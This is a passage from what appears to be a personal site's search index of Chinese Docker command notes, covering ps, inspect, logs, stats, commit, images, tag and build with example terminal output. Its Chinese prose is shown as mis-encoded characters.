åˆ—å‡ºæœ€è¿‘åˆ›å»ºçš„5ä¸ªå®¹å™¨ä¿¡æ¯ã€‚ yanque@yanquedembp ~ % docker ps -n 5 CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES de1871a5ebeb whyour/qinglong:latest \"./docker/docker-entâ€¦\" 2 weeks ago Exited ( 137 ) 3 hours ago qinglong åˆ—å‡ºæ‰€æœ‰åˆ›å»ºçš„å®¹å™¨IDã€‚ yanque@yanquedembp ~ % docker ps -a -q de1871a5ebeb inspect docker inspect : è·å–å®¹å™¨/é•œåƒçš„å…ƒæ•°æ® è¯­æ³• docker inspect [OPTIONS] NAME|ID [NAME|ID...] OPTIONSè¯´æ˜ï¼š -f :æŒ‡å®šè¿”å›å€¼çš„æ¨¡æ¿æ–‡ä»¶ã€‚ -s :æ˜¾ç¤ºæ€»çš„æ–‡ä»¶å¤§å°ã€‚ --type :ä¸ºæŒ‡å®šç±»å‹è¿”å›JSONã€‚ ç¤ºä¾‹ è·å– pythoné•œåƒ å…ƒæ•°æ® yanque@yanquedembp mytest % yanque@yanquedembp mytest % docker inspect python [ { \"Id\" : \"sha256:26acbad26a2ca1387add4d4d07957e88d18930fb47580a90313de939873c75d8\" , \"RepoTags\" : [ \"python:latest\" ] , \"RepoDigests\" : [ \"python@sha256:497a6f39e10440ab20242b56693fbc2d0549b515cd585328a702720ff4db6bd5\" ] , \"Parent\" : \"\" , \"Comment\" : \"\" , \"Created\" : \"2017-09-13T14:27:41.728086539Z\" , \"Container\" : \"0018f3382d15704565819e20c299fe0346dcbc3cfc48b17e528dfbc3c068d433\" , \"ContainerConfig\" : { \"Hostname\" : \"0018f3382d15\" , \"Domainname\" : \"\" , \"User\" : \"\" , \"AttachStdin\" : false, \"AttachStdout\" : false, \"AttachStderr\" : false, \"Tty\" : false, \"OpenStdin\" : false, \"StdinOnce\" : false, \"Env\" : [ \"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" , \"LANG=C.UTF-8\" , \"GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\" , \"PYTHON_VERSION=3.6.2\" , \"PYTHON_PIP_VERSION=9.0.1\" ] , \"Cmd\" : [ \"/bin/sh\" , \"-c\" , \"#(nop) \" , \"CMD [\\\"python3\\\"]\" ] , \"ArgsEscaped\" : true, \"Image\" : \"sha256:3cc8e180255b46231404d2ae57c380015063812b3da3254909555d4dd7f3b905\" , \"Volumes\" : null, \"WorkingDir\" : \"\" , \"Entrypoint\" : null, \"OnBuild\" : [] , \"Labels\" : {} } , \"DockerVersion\" : \"17.06.2-ce\" , \"Author\" : \"\" , \"Config\" : { \"Hostname\" : \"\" , \"Domainname\" : \"\" , \"User\" : \"\" , \"AttachStdin\" : false, \"AttachStdout\" : false, \"AttachStderr\" : false, \"Tty\" : false, \"OpenStdin\" : false, \"StdinOnce\" : false, \"Env\" : [ \"PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\" , \"LANG=C.UTF-8\" , \"GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D\" , \"PYTHON_VERSION=3.6.2\" , \"PYTHON_PIP_VERSION=9.0.1\" ] , \"Cmd\" : [ \"python3\" ] , \"ArgsEscaped\" : true, \"Image\" : \"sha256:3cc8e180255b46231404d2ae57c380015063812b3da3254909555d4dd7f3b905\" , \"Volumes\" : null, \"WorkingDir\" : \"\" , \"Entrypoint\" : null, \"OnBuild\" : [] , \"Labels\" : null } , \"Architecture\" : \"amd64\" , \"Os\" : \"linux\" , \"Size\" : 689734109 , \"VirtualSize\" : 689734109 , \"GraphDriver\" : { \"Data\" : { \"LowerDir\" : \"/var/lib/docker/overlay2/c26d04f12ee93cf5d1856f63eb61dca2b866417b8d73cec1e9baa5860fa3cd61/diff:/var/lib/docker/overlay2/9245eeb0a8f0f9412452d02e23633ebb762288083c15392e57385332ee5793ef/diff:/var/lib/docker/overlay2/d448eb624cefd5b3af0fb2e5780df0538a39304bf30402568136f23c905d5f2c/diff:/var/lib/docker/overlay2/4d10354dd281b1040ed8b9f8924d978f8b6f3599a39e82ff87c0b08052cd2ade/diff:/var/lib/docker/overlay2/ebec34fd45fac8ec2858f01593d7d3117e21b6c97786bbea01742e705fd8a6b3/diff:/var/lib/docker/overlay2/edd8ed31051b48638c8b05dd8fdaecd65e245ef296b9ddbba98da08b53c35cd6/diff:/var/lib/docker/overlay2/5732de9fa78c685f662b1715a712c6651c54878ae67a955981ccdb1c3c4b5024/diff\" , \"MergedDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/merged\" , \"UpperDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/diff\" , \"WorkDir\" : \"/var/lib/docker/overlay2/e96aa157f1fe9bfad88b1597c7c821a18c8a5b507977fe0fbbc9fab22846af18/work\" } , \"Name\" : \"overlay2\" } , \"RootFS\" : { \"Type\" : \"layers\" , \"Layers\" : [ \"sha256:18f9b4e2e1bcd5abe381a557c44cba379884c88f6049564f58fd8c10ab5733df\" , \"sha256:d70ce8b0dad684a9e2294b64afa06b8848db950c109cde60cb543bf16d5093c9\" , \"sha256:ecd70829ec3d4a56a3eca79cec39d5ab3e4d404bf057ea74cf82682bb965e119\" , \"sha256:7381522c58b0db7134590fdcbc3b648865325f638427f69a474adc22e6b918af\" , \"sha256:1e96ffb4a81f9b0fbb625448b7d0b6b6a38b0b9eb891473320a90df91ded2acf\" , \"sha256:ec71859e4a965f98cb08cd85ef5ea52753fd26f811ba556264b2b08bb7b911b6\" , \"sha256:24b78eec42f88fb03c35a48f28301b0d2a26598c7795101184177ed00998880b\" , \"sha256:6bcbbdeefa0a25adf0cdab0004b772c21f16eb119965c8588ef100414d01b53f\" ] } , \"Metadata\" : { \"LastTagTime\" : \"0001-01-01T00:00:00Z\" } } ] yanque@yanquedembp mytest % top docker top :æŸ¥çœ‹å®¹å™¨ä¸­è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ï¼Œæ”¯æŒ ps å‘½ä»¤å‚æ•° è¯­æ³• docker top [OPTIONS] CONTAINER [ps OPTIONS] æ³¨è§£ å®¹å™¨è¿è¡Œæ—¶ä¸ä¸€å®šæœ‰/bin/bashç»ˆç«¯æ¥äº¤äº’æ‰§è¡Œtopå‘½ä»¤ï¼Œè€Œä¸”å®¹å™¨è¿˜ä¸ä¸€å®šæœ‰topå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨docker topæ¥å®ç°æŸ¥çœ‹ container (å®¹å™¨) ä¸­æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚ ç¤ºä¾‹ æŸ¥çœ‹å®¹å™¨ mykali çš„è¿›ç¨‹ä¿¡æ¯ã€‚ yanque@yanquedembp mytest % docker top mykali UID PID PPID C STIME TTY TIME CMD root 3177 3152 0 03 :19 ? 00 :00:00 /usr/bin/qemu-aarch64 /usr/bin/bash bash root 3419 3152 0 06 :36 ? 00 :00:00 /usr/bin/qemu-aarch64 /bin/bash /bin/bash yanque@yanquedembp mytest % æŸ¥çœ‹æ‰€æœ‰è¿è¡Œå®¹å™¨çš„è¿›ç¨‹ä¿¡æ¯ã€‚ for i in ` docker ps | grep Up | awk '{print $1}' ` ; do echo \\ && docker top $i ; done attach docker attach :è¿æ¥åˆ°æ­£åœ¨è¿è¡Œä¸­çš„å®¹å™¨ã€‚ è¯­æ³• docker attach [OPTIONS] CONTAINER è¦attachä¸Šå»çš„å®¹å™¨å¿…é¡»æ­£åœ¨è¿è¡Œï¼Œå¯ä»¥åŒæ—¶è¿æ¥ä¸ŠåŒä¸€ä¸ª container æ¥å…±äº«å±å¹•ï¼ˆä¸screenå‘½ä»¤çš„attachç±»ä¼¼ï¼‰ã€‚ å®˜æ–¹æ–‡æ¡£ä¸­è¯´attachåå¯ä»¥é€šè¿‡CTRL-Cæ¥ detach ï¼Œä½†å®é™…ä¸Šç»è¿‡æˆ‘çš„æµ‹è¯•ï¼Œå¦‚æœ container å½“å‰åœ¨è¿è¡Œbashï¼ŒCTRL-Cè‡ªç„¶æ˜¯å½“å‰è¡Œçš„è¾“å…¥ï¼Œæ²¡æœ‰é€€å‡ºï¼›å¦‚æœ container å½“å‰æ­£åœ¨å‰å°è¿è¡Œè¿›ç¨‹ï¼Œå¦‚è¾“å‡ºnginxçš„ access .logæ—¥å¿—ï¼ŒCTRL-Cä¸ä»…ä¼šå¯¼è‡´é€€å‡ºå®¹å™¨ï¼Œè€Œä¸”è¿˜stopäº†ã€‚è¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œ detach çš„æ„æ€æŒ‰ç†åº”è¯¥æ˜¯è„±ç¦»å®¹å™¨ç»ˆç«¯ï¼Œä½†å®¹å™¨ä¾ç„¶è¿è¡Œã€‚å¥½åœ¨attachæ˜¯å¯ä»¥å¸¦ä¸Š--sig-proxy=falseæ¥ç¡®ä¿CTRL-Dæˆ–CTRL-Cä¸ä¼šå…³é—­å®¹å™¨ã€‚ ç¤ºä¾‹ å®¹å™¨mynginxå°†è®¿é—®æ—¥å¿—æŒ‡åˆ°æ ‡å‡†è¾“å‡ºï¼Œè¿æ¥åˆ°å®¹å™¨æŸ¥çœ‹è®¿é—®ä¿¡æ¯ã€‚ runoob@runoob:~$ docker attach --sig-proxy = false mynginx 192 .168.239.1 - - [ 10 /Jul/2016:16:54:26 +0000 ] \"GET / HTTP/1.1\" 304 0 \"-\" \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36\" \"-\" events docker events : ä»æœåŠ¡å™¨è·å–å®æ—¶äº‹ä»¶ è¯­æ³• docker events [OPTIONS] OPTIONSè¯´æ˜ -f ï¼šæ ¹æ®æ¡ä»¶è¿‡æ»¤äº‹ä»¶ï¼› --since ï¼šä»æŒ‡å®šçš„æ—¶é—´æˆ³åæ˜¾ç¤ºæ‰€æœ‰äº‹ä»¶; --until ï¼šæµæ°´æ—¶é—´æ˜¾ç¤ºåˆ°æŒ‡å®šçš„æ—¶é—´ä¸ºæ­¢ï¼› ç¤ºä¾‹ æ˜¾ç¤ºdocker é•œåƒä¸º python 2022å¹´10æœˆ1æ—¥åçš„ç›¸å…³äº‹ä»¶ã€‚ yanque@yanquedembp mytest % docker events --since = \"1672204137\" -f \"image\" = \"python\" 2022 -12-28T15:30:25.569291322+08:00 image pull python:latest ( name = python ) 2022 -12-28T15:30:41.440253288+08:00 container create 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:41.446677063+08:00 container attach 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:42.106046916+08:00 container start 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( image = python, name = objective_burnell ) 2022 -12-28T15:30:42.216118892+08:00 container die 7932605f6337cecda520ef7aab9702e0d18ce506e9a96967b5feaac7f3998fa9 ( exitCode = 0 , image = python, name = objective_burnell ) 2022 -12-28T15:31:02.434099427+08:00 container create 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.437918597+08:00 container attach 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.709044368+08:00 container start 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( image = python, name = peaceful_jones ) 2022 -12-28T15:31:02.784000217+08:00 container die 9221c1215238177472921fb1f38a9cf0a3a2f3e4ea6e3f27b9e30a8620603799 ( exitCode = 0 , image = python, name = peaceful_jones ) 2022 -12-28T15:31:11.441315766+08:00 container create 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.446211552+08:00 container attach 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.725841917+08:00 container start 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( image = python, name = nifty_hawking ) 2022 -12-28T15:31:11.734199431+08:00 container resize 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( height = 58 , image = python, name = nifty_hawking, width = 166 ) 2022 -12-28T15:31:38.000185842+08:00 container die 491ca524a65358209d3db71648f07a0e319c827b1cfd6b672d66e338baa917dd ( exitCode = 0 , image = python, name = nifty_hawking ) 2022 -12-28T15:31:41.223429147+08:00 container create 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.227702518+08:00 container attach 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.447076652+08:00 container start 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( image = python, name = fervent_hofstadter ) 2022 -12-28T15:31:41.455181214+08:00 container resize 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( height = 58 , image = python, name = fervent_hofstadter, width = 166 ) 2022 -12-28T15:31:51.146816850+08:00 container die 83b54283c0f7640a2c8814341fb8d3f289d4bbec830b7995c12a7e141fb090f5 ( exitCode = 0 , image = python, name = fervent_hofstadter ) &#94;C% yanque@yanquedembp mytest % å¦‚æœæŒ‡å®šçš„æ—¶é—´æ˜¯åˆ°ç§’çº§çš„ï¼Œéœ€è¦å°†æ—¶é—´è½¬æˆæ—¶é—´æˆ³ã€‚å¦‚æœæ—¶é—´ä¸ºæ—¥æœŸçš„è¯ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå¦‚--since=\"2022-10-01\"ã€‚ logs docker logs : è·å–å®¹å™¨çš„æ—¥å¿— è¯­æ³•: docker logs [OPTIONS] CONTAINER OPTIONSè¯´æ˜ -f è·Ÿè¸ªæ—¥å¿—è¾“å‡º --since æ˜¾ç¤ºæŸä¸ªå¼€å§‹æ—¶é—´çš„æ‰€æœ‰æ—¥å¿— -t æ˜¾ç¤ºæ—¶é—´æˆ³ --tail ä»…åˆ—å‡ºæœ€æ–°Næ¡å®¹å™¨æ—¥å¿— ç¤ºä¾‹ è·Ÿè¸ªæŸ¥çœ‹å®¹å™¨ mykali çš„æ—¥å¿—è¾“å‡º yanque@yanquedembp mytest % docker logs -f mykali â”Œâ”€â”€ ( rootã‰¿fa15654fc7d1 ) - [ / ] &#94;C% wait docker wait : é˜»å¡è¿è¡Œç›´åˆ°å®¹å™¨åœæ­¢ï¼Œç„¶åæ‰“å°å‡ºå®ƒçš„é€€å‡ºä»£ç  è¯­æ³• docker wait [OPTIONS] CONTAINER [CONTAINER...] ç¤ºä¾‹ docker wait CONTAINER export docker export : å°†æ–‡ä»¶ç³»ç»Ÿä½œä¸ºä¸€ä¸ªtarå½’æ¡£æ–‡ä»¶å¯¼å‡ºåˆ°STDOUTã€‚ è¯­æ³• docker export [OPTIONS] CONTAINER OPTIONSè¯´æ˜ -o :å°†è¾“å…¥å†…å®¹å†™åˆ°æ–‡ä»¶ã€‚ ç¤ºä¾‹ å°†å®¹å™¨ mykali æŒ‰æ—¥æœŸä¿å­˜ä¸ºtaræ–‡ä»¶ã€‚ yanque@yanquedembp test % docker export -o mykali-`date +%Y%m%d`.tar mykali yanque@yanquedembp test % ls 1.txt c++ dd mykali-20221228.tar yanque@yanquedembp test % ls -lh mykali-20221228.tar -rw-------@ 1 yanque staff 231M 12 28 16:20 mykali-20221228.tar yanque@yanquedembp test % port docker port ç”¨äºåˆ—å‡ºæŒ‡å®šçš„å®¹å™¨çš„ç«¯å£æ˜ å°„ï¼Œæˆ–è€…æŸ¥æ‰¾å°† PRIVATE_PORT NAT åˆ°é¢å‘å…¬ä¼—çš„ç«¯å£ è¯­æ³•: docker port [OPTIONS] CONTAINER [PRIVATE_PORT[/PROTO]] ç¤ºä¾‹ æŸ¥çœ‹å®¹å™¨ mykali çš„ç«¯å£æ˜ å°„æƒ…å†µ yanque@yanquedembp test % docker port mykali 5900 /tcp -> 0 .0.0.0:60000 5901 /tcp -> 0 .0.0.0:60001 5902 /tcp -> 0 .0.0.0:60002 stats docker stats : æ˜¾ç¤ºå®¹å™¨èµ„æºçš„ä½¿ç”¨æƒ…å†µï¼ŒåŒ…æ‹¬ï¼šCPUã€å†…å­˜ã€ç½‘ç»œ I/O ç­‰ è¯­æ³• docker stats [OPTIONS] [CONTAINER...] OPTIONSè¯´æ˜ --all , -a :æ˜¾ç¤ºæ‰€æœ‰çš„å®¹å™¨ï¼ŒåŒ…æ‹¬æœªè¿è¡Œçš„ã€‚ --format (æ ¼å¼) :æŒ‡å®šè¿”å›å€¼çš„æ¨¡æ¿æ–‡ä»¶ã€‚ --no-stream :å±•ç¤ºå½“å‰çŠ¶æ€å°±ç›´æ¥é€€å‡ºäº†ï¼Œä¸å†å®æ—¶æ›´æ–°ã€‚ --no-trunc :ä¸æˆªæ–­è¾“å‡ºã€‚ ç¤ºä¾‹ åˆ—å‡ºæ‰€æœ‰åœ¨è¿è¡Œçš„å®¹å™¨ä¿¡æ¯ã€‚ yanque@yanquedembp test % docker stats CONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDS fa15654fc7d1 mykali 0 .00% 23 .63MiB / 7 .675GiB 0 .30% 1 .51kB / 0B 6 .15MB / 4 .1kB 4 è¾“å‡ºè¯¦æƒ…ä»‹ç» CONTAINER ID ä¸ NAME: å®¹å™¨ ID ä¸åç§°ã€‚ CPU % ä¸ MEM %: å®¹å™¨ä½¿ç”¨çš„ CPU å’Œå†…å­˜çš„ç™¾åˆ†æ¯”ã€‚ MEM USAGE / LIMIT (é™åˆ¶) : å®¹å™¨æ­£åœ¨ä½¿ç”¨çš„æ€»å†…å­˜ï¼Œä»¥åŠå…è®¸ä½¿ç”¨çš„å†…å­˜æ€»é‡ã€‚ NET I/O: å®¹å™¨é€šè¿‡å…¶ç½‘ç»œæ¥å£å‘é€å’Œæ¥æ”¶çš„æ•°æ®é‡ã€‚ BLOCK I/O: å®¹å™¨ä»ä¸»æœºä¸Šçš„å—è®¾å¤‡è¯»å–å’Œå†™å…¥çš„æ•°æ®é‡ã€‚ PIDs: å®¹å™¨åˆ›å»ºçš„è¿›ç¨‹æˆ–çº¿ç¨‹æ•°ã€‚ æ ¹æ®å®¹å™¨ç­‰ ID æˆ–åç§°ç°å®ä¿¡æ¯, æ”¯æŒå¤šä¸ª: yanque@yanquedembp test % docker stats mykali CONTAINER ID NAME CPU % MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O PIDS fa15654fc7d1 mykali 0 .00% 23 .63MiB / 7 .675GiB 0 .30% 1 .51kB / 0B 6 .15MB / 4 .1kB 4 ä»¥ JSON æ ¼å¼è¾“å‡ºï¼š yanque@yanquedembp test % docker stats mykali --no-stream --format \"{{json .}}\" { \"BlockIO\" : \"6.15MB / 4.1kB\" , \"CPUPerc\" : \"0.00%\" , \"Container\" : \"mykali\" , \"ID\" : \"fa15654fc7d1\" , \"MemPerc\" : \"0.30%\" , \"MemUsage\" : \"23.63MiB / 7.675GiB\" , \"Name\" : \"mykali\" , \"NetIO\" : \"1.58kB / 0B\" , \"PIDs\" : \"4\" } yanque@yanquedembp test % è¾“å‡ºæŒ‡å®šçš„ä¿¡æ¯ï¼š yanque@yanquedembp test % docker stats --no-stream --all --format \"table {{.Container}}\\t{{.CPUPerc}}\\t{{.MemUsage}}\" mykali CONTAINER CPU % MEM USAGE / LIMIT mykali 0 .00% 23 .63MiB / 7 .675GiB","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-operation.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-operation.html"},{"title":"å®¹å™¨rootfså‘½ä»¤","text":"commit ä»å®¹å™¨åˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒ è¯­æ³• docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]] OPTIONSè¯´æ˜ï¼š -a :æäº¤çš„é•œåƒä½œè€…ï¼› -c :ä½¿ç”¨DockerfileæŒ‡ä»¤æ¥åˆ›å»ºé•œåƒï¼› -m :æäº¤æ—¶çš„è¯´æ˜æ–‡å­—ï¼› -p :åœ¨commitæ—¶ï¼Œå°†å®¹å™¨æš‚åœã€‚ ç¤ºä¾‹ å°†å®¹å™¨ ea0a6afe23a3 ä¿å­˜ä¸ºæ–°çš„é•œåƒ, è®¾ç½®ä»“åº“åä¸º kali , tagä¸º config_apt_list2 , å¹¶æ·»åŠ æäº¤äººä¿¡æ¯å’Œè¯´æ˜ä¿¡æ¯ã€‚ ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker commit -a 'yanque' -m 'kali image with config ustc apt list' ea0a6afe23a3 kali:config_apt_list2 sha256:24b7cbbe11fb587bf850dad2f2dc1b46412a2c73c2b55a00716dabb1b7832204 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images kali:config_apt_list2 REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 56 seconds ago 236MB cp docker cp :ç”¨äºå®¹å™¨ä¸ä¸»æœºä¹‹é—´çš„æ•°æ®æ‹·è´ã€‚ è¯­æ³• docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|- docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH OPTIONSè¯´æ˜ï¼š -L :ä¿æŒæºç›®æ ‡ä¸­çš„é“¾æ¥ ç¤ºä¾‹ å°†ä¸»æœº README.en.md æ‹·è´åˆ°å®¹å™¨ mykali çš„ /root ç›®å½•ä¸‹ã€‚ yanque@yanquedembp mytest % docker cp README.en.md mykali:/root yanque@yanquedembp mytest % ls -lh README.en.md -rw-r--r-- 1 yanque staff 816B 10 22 02 :12 README.en.md yanque@yanquedembp mytest % yanque@yanquedembp mytest % docker exec -it mykali /bin/bash â”Œâ”€â”€ ( rootã‰¿fa15654fc7d1 ) - [ / ] â””â”€# â”Œâ”€â”€ ( rootã‰¿fa15654fc7d1 ) - [ ~ ] â””â”€# cd ~ && ls -lh total 4 .0K -rw-r--r-- 1 501 dialout 816 Oct 21 18 :12 README.en.md â”Œâ”€â”€ ( rootã‰¿fa15654fc7d1 ) - [ ~ ] â””â”€# diff docker diff : æ£€æŸ¥å®¹å™¨é‡Œæ–‡ä»¶ç»“æ„çš„æ›´æ”¹ è¯­æ³• docker diff [OPTIONS] CONTAINER ç¤ºä¾‹ æŸ¥çœ‹å®¹å™¨ mykali çš„æ–‡ä»¶ç»“æ„æ›´æ”¹ã€‚ yanque@yanquedembp ~ % docker diff mykali C /root C /root/.bash_history yanque@yanquedembp ~ %","tags":"å®¹å™¨ä¸é›†ç¾¤","url":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-rootfs-command.html","loc":"/yq-doc-source-docs-Container-and-cluster-docker-docker_command-Container-rootfs-command.html"},{"title":"æœ¬åœ°é•œåƒç®¡ç†","text":"images docker images : åˆ—å‡ºæœ¬åœ°é•œåƒ è¯­æ³•: docker images [OPTIONS] [REPOSITORY[:TAG]] OPTIONSè¯´æ˜ï¼š -a åˆ—å‡ºæœ¬åœ°æ‰€æœ‰çš„é•œåƒï¼ˆå«ä¸­é—´æ˜ åƒå±‚ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¿‡æ»¤æ‰ä¸­é—´æ˜ åƒå±‚ï¼‰ï¼› --digests æ˜¾ç¤ºé•œåƒçš„æ‘˜è¦ä¿¡æ¯ï¼› -f æ˜¾ç¤ºæ»¡è¶³æ¡ä»¶çš„é•œåƒï¼› --format æŒ‡å®šè¿”å›å€¼çš„æ¨¡æ¿æ–‡ä»¶ï¼› æ¯”å¦‚åªæ˜¾ç¤ºID: docker images --format \"{{.ID}}\" ä»¥è¡¨æ ¼å½¢å¼ç¾åŒ–æ˜¾ç¤º(é»˜è®¤å°±æ˜¯è¡¨æ ¼): docker images --format \"table {{.ID}}\\t{{.Repository}}\\t{{.Tag}}\" --no-trunc æ˜¾ç¤ºå®Œæ•´çš„é•œåƒä¿¡æ¯ï¼› -q åªæ˜¾ç¤ºé•œåƒIDã€‚ ç¤ºä¾‹ æ˜¾ç¤ºæœ¬åœ°é•œåƒåˆ—è¡¨ yanque@yanquedembp test % docker images REPOSITORY TAG IMAGE ID CREATED SIZE yanquer/kali config_apt_list2 24b7cbbe11fb 2 days ago 236MB whyour/qinglong latest a5db91bf7c98 2 weeks ago 322MB kalilinux/kali-rolling latest c2fadbc65f8d 11 months ago 126MB python latest 26acbad26a2c 5 years ago 690MB java latest d23bdf5b1b1b 5 years ago 643MB æ˜¾ç¤ºä»“åº“ä¸º yanquer/kali é•œåƒä¿¡æ¯ä»¥åŠæ‘˜è¦ä¿¡æ¯ yanque@yanquedembp test % docker images --digests yanquer/kali REPOSITORY TAG DIGEST IMAGE ID CREATED SIZE yanquer/kali config_apt_list2 sha256:161c0ffd5197fa4a4a88d00e53ccf43500da3b075f1793d9a3722c6c0bdf15ff 24b7cbbe11fb 2 days ago 236MB rmi åˆ é™¤image è¯­æ³• docker rmi [OPTIONS] IMAGE [IMAGE...] OPTIONSè¯´æ˜ï¼š -f :å¼ºåˆ¶åˆ é™¤ï¼› --no-prune :ä¸ç§»é™¤è¯¥é•œåƒçš„è¿‡ç¨‹é•œåƒï¼Œé»˜è®¤ç§»é™¤ï¼› ç¤ºä¾‹ å¼ºåˆ¶åˆ é™¤æœ¬åœ°é•œåƒ kali:config_apt_list1ã€‚ ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 3 minutes ago 236MB kali config_apt_list1 167a6460c75d 9 minutes ago 236MB kalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker rmi kali:config_apt_list1 Untagged: kali:config_apt_list1 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 6 minutes ago 236MB kalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB tag æ ‡è®°æœ¬åœ°é•œåƒï¼Œå°†å…¶å½’å…¥æŸä¸€ä»“åº“ã€‚ å¯ç”¨äºæ›´æ–°åç§°ç„¶ååˆ é™¤æ—§çš„. è¯­æ³• docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG] ç¤ºä¾‹ å°†é•œåƒ kali:config_apt_list1 æ ‡è®°ä¸º yanquer/kali:config_apt_list2 é•œåƒã€‚ ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 6 minutes ago 236MB kalilinux/kali-rolling latest ae8b160e1ecb 9 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker tag 24b7cbbe11fb yanquer/kali:config_apt_list2 ( dev_venv ) yanque@yanquedeMacBook-Pro project % ( dev_venv ) yanque@yanquedeMacBook-Pro project % docker images REPOSITORY TAG IMAGE ID CREATED SIZE kali config_apt_list2 24b7cbbe11fb 25 minutes ago 236MB yanquer/kali config_apt_list2 24b7cbbe11fb 25 minutes ago 236MB kalilinux/kali-rolling latest ae8b160e1ecb 10 hours ago 140MB ( dev_venv ) yanque@yanquedeMacBook-Pro project % build docker build å‘½ä»¤ç”¨äºä½¿ç”¨ Dockerfile åˆ›å»ºé•œåƒã€‚ è¯­æ³•: docker build [OPTIONS] PATH | URL | - OPTIONSè¯´æ˜ï¼š --build-arg è®¾ç½®é•œåƒåˆ›å»ºæ—¶çš„å˜é‡ --build-arg=[] ï¼› --cpu-shares è®¾ç½® cpu ä½¿ç”¨æƒé‡ï¼› --cpu-period é™åˆ¶ CPU CFSå‘¨æœŸï¼› --cpu-quota é™åˆ¶ CPU CFSé…é¢ï¼› --cpuset-cpus æŒ‡å®šä½¿ç”¨çš„CPU idï¼› --cpuset-mems æŒ‡å®šä½¿ç”¨çš„å†…å­˜ idï¼› --disable-content-trust å¿½ç•¥æ ¡éªŒï¼Œé»˜è®¤å¼€å¯ï¼› -f æŒ‡å®šè¦ä½¿ç”¨çš„Dockerfileè·¯å¾„ï¼› --force-rm è®¾ç½®é•œåƒè¿‡ç¨‹ä¸­åˆ é™¤ä¸­é—´å®¹å™¨ï¼› --isolation ä½¿ç”¨å®¹å™¨éš”ç¦»æŠ€æœ¯ï¼› --label è®¾ç½®é•œåƒä½¿ç”¨çš„å…ƒæ•°æ®, --label=[] ï¼› -m è®¾ç½®å†…å­˜æœ€å¤§å€¼ï¼› --memory-swap è®¾ç½® Swap (äº¤æ¢) çš„æœ€å¤§å€¼ä¸ºå†…å­˜+ Swap (äº¤æ¢) ï¼Œ\"-1\"è¡¨ç¤ºä¸é™ Swap (äº¤æ¢) ï¼› --no-cache 